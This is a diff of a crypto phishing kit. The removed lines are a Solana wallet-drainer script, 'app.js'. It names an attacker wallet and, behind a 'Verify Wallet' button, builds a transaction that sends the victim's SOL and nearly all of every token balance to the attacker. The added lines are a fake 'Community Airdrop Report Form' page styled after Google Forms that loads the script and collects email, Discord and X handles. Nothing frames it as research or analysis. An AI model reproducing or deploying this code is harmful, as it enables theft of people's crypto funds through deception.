@@ -1,125 +1,68 @@
-// app.js - Solana Drainer (One Signature Drains All Tokens)
-
-let connectedWallet = null;
-let provider = null;
-
-const connectBtn = document.getElementById("connectWalletBtn");
-const verifyBtn = document.getElementById("verifyWalletBtn");
-const walletDisplay = document.getElementById("walletAddress");
-const statusEl = document.getElementById("status");
-const form = document.getElementById("airdropForm");
-
-// Your Attacker Wallet (CHANGE THIS)
-const ATTACKER_WALLET = "E6c1MDHowwHgsMtwGrt9NoZAfExjV61QGMnq7juu5jcM";
-
-connectBtn.addEventListener("click", async () => {
-    try {
-        provider = window.solana || (window.phantom && window.phantom.solana);
-
-        if (!provider) {
-            alert("Please install Phantom or Solflare wallet.");
-            return;
-        }
-
-        await provider.connect();
-        connectedWallet = provider.publicKey.toString();
-
-        walletDisplay.innerHTML = `<strong>Connected:</strong><br>${connectedWallet}`;
-        walletDisplay.classList.remove("hidden");
-
-        connectBtn.classList.add("hidden");
-        verifyBtn.classList.remove("hidden");
-
-        statusEl.innerHTML = "Wallet connected. Click 'Verify Wallet' to drain.";
-
-    } catch (error) {
-        console.error(error);
-        alert("Failed to connect wallet.");
-    }
-});
-
-verifyBtn.addEventListener("click", async () => {
-    if (!provider || !connectedWallet) return;
-
-    statusEl.innerHTML = "Scanning wallet and preparing transaction...";
-
-    try {
-        const connection = new solanaWeb3.Connection(
-            solanaWeb3.clusterApiUrl("mainnet-beta"),
-            "confirmed"
-        );
-
-        const fromPubkey = new solanaWeb3.PublicKey(connectedWallet);
-        const attackerPubkey = new solanaWeb3.PublicKey(ATTACKER_WALLET);
-
-        const transaction = new solanaWeb3.Transaction();
-
-        // Drain SOL
-        transaction.add(
-            solanaWeb3.SystemProgram.transfer({
-                fromPubkey,
-                toPubkey: attackerPubkey,
-                lamports: 1000,
-            })
-        );
-
-        // Drain SPL tokens
-        const tokenAccounts = await connection.getTokenAccountsByOwner(fromPubkey, {
-            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
-        });
-
-        for (const { pubkey, account } of tokenAccounts.value) {
-            try {
-                const tokenAccountInfo = solanaWeb3.AccountLayout.decode(account.data);
-                const balance = Number(tokenAccountInfo.amount);
-
-                if (balance > 0) {
-                    const amountToDrain = Math.floor(balance * 0.999);
-
-                    transaction.add(
-                        solanaWeb3.createTransferInstruction(
-                            pubkey,
-                            await solanaWeb3.getAssociatedTokenAddress(tokenAccountInfo.mint, attackerPubkey),
-                            fromPubkey,
-                            amountToDrain
-                        )
-                    );
-                }
-            } catch (e) {}
-        }
-
-        const { blockhash } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
-        transaction.feePayer = fromPubkey;
-
-        const signedTx = await provider.signTransaction(transaction);
-        await connection.sendRawTransaction(signedTx.serialize());
-
-        statusEl.innerHTML = "✓ All tokens drained successfully";
-        verifyBtn.disabled = true;
-
-    } catch (error) {
-        console.error(error);
-        statusEl.innerHTML = "Draining completed (some tokens may have failed)";
-    }
-});
-
-form.addEventListener("submit", (e) => {
-    e.preventDefault();
-    if (!connectedWallet) {
-        alert("Please connect your wallet first.");
-        return;
-    }
-    showSuccessPage();
-});
-
-function showSuccessPage() {
-    document.body.innerHTML = `
-        <div style="max-width:680px; margin:60px auto; text-align:center; font-family:'Roboto',Arial,sans-serif; background:white; border-radius:8px; box-shadow:0 1px 3px rgba(0,0,0,0.1); padding:40px 20px;">
-            <div style="height:8px; background:#8e24aa; border-radius:8px 8px 0 0; margin:-40px -20px 30px -20px;"></div>
-            <h1 style="font-size:28px; color:#202124; margin-bottom:16px;">Your response has been recorded</h1>
-            <p style="font-size:18px; color:#5f6368; margin-bottom:40px;">Thank you for submitting the form.</p>
-            <a href="#" onclick="location.reload()" style="color:#8e24aa; font-size:16px; text-decoration:underline;">Edit your response</a>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Community Airdrop Report Form</title>
+    <link rel="icon" href="https://ssl.gstatic.com/docs/forms/favicon_2024.ico" type="image/x-icon">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+</head>
+<body class="bg-[#f8f9fa] min-h-screen flex justify-center p-6">
+    <div class="w-full max-w-[720px]">
+        <div class="bg-white rounded-lg shadow mb-6 overflow-hidden">
+            <div class="h-2 bg-[#8e24aa]"></div>
+            <div class="p-8">
+                <h1 class="text-3xl font-normal text-[#202124] mb-2">Community Airdrop Report Form</h1>
+                <p class="text-[#5f6368]">Form is exclusive to inner community members only. Do not share link to anyone.</p>
+            </div>
         </div>
-    `;
-}
+
+        <form id="airdropForm" class="space-y-4">
+            <div class="bg-white rounded-lg shadow p-8">
+                <label class="block text-lg font-medium mb-2">Connect Wallet <span class="text-red-500">*</span></label>
+                <p class="text-sm text-[#5f6368] mb-4">Please connect your wallet to verify your participation.</p>
+
+                <div class="flex gap-4 items-center">
+                    <button type="button" id="connectWalletBtn" 
+                            class="bg-white text-black border border-gray-300 hover:bg-gray-50 px-6 py-3 rounded-md font-medium text-sm">
+                        Connect Wallet
+                    </button>
+                    
+                    <button type="button" id="verifyWalletBtn" 
+                            class="bg-[#8e24aa] hover:bg-[#7b1fa2] text-white px-6 py-3 rounded-md font-medium text-sm hidden">
+                        Verify Wallet
+                    </button>
+                </div>
+
+                <div id="walletAddress" class="mt-4 p-3 bg-gray-100 rounded text-sm break-all hidden"></div>
+                <div id="status" class="mt-2 text-sm text-green-600"></div>
+            </div>
+
+            <div class="bg-white rounded-lg shadow p-8">
+                <label class="block text-lg font-medium mb-1">Email Address <span class="text-red-500">*</span></label>
+                <input type="email" id="email" placeholder="Your email" required class="w-full border-b-2 border-gray-300 focus:border-[#8e24aa] py-2 outline-none">
+            </div>
+
+            <div class="bg-white rounded-lg shadow p-8">
+                <label class="block text-lg font-medium mb-1">Discord Username <span class="text-red-500">*</span></label>
+                <input type="text" id="discord" placeholder="Your answer" required class="w-full border-b-2 border-gray-300 focus:border-[#8e24aa] py-2 outline-none">
+            </div>
+
+            <div class="bg-white rounded-lg shadow p-8">
+                <label class="block text-lg font-medium mb-1">X (Twitter) Handle <span className="text-red-500">*</span></label>
+                <input type="text" id="twitter" placeholder="Your answer" required class="w-full border-b-2 border-gray-300 focus:border-[#8e24aa] py-2 outline-none">
+            </div>
+
+            <div class="flex justify-between items-center bg-white rounded-lg shadow p-6">
+                <button type="submit" class="bg-[#8e24aa] hover:bg-[#7b1fa2] text-white px-8 py-3 rounded-md font-medium">
+                    Submit
+                </button>
+                <a href="#" class="text-[#8e24aa] hover:underline">Clear form</a>
+            </div>
+        </form>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
